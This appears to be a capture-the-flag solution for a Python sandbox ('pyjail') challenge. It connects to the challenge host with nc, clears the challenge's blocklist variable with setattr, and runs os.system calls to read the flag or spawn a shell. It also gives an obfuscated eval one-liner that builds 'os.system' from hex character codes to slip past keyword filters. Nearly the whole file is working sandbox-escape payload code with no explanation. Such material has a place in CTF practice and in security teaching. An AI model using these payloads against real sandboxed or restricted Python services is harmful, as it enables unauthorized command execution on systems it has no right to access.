# __builtins__.eval('''"__import__('os')%csystem('sh')" % 0x2e''')

nc chal.firebird.sh 35010
setattr(__import__('__main__'), 'blocklist', '')
__import__("os").system('/readflag /flag')

# one-liner
setattr(__import__('__main__'),'eq','''eval("__import__('os')%csystem('%creadflag %cflag')" % (0x2e, 0x2f, 0x2f))''')
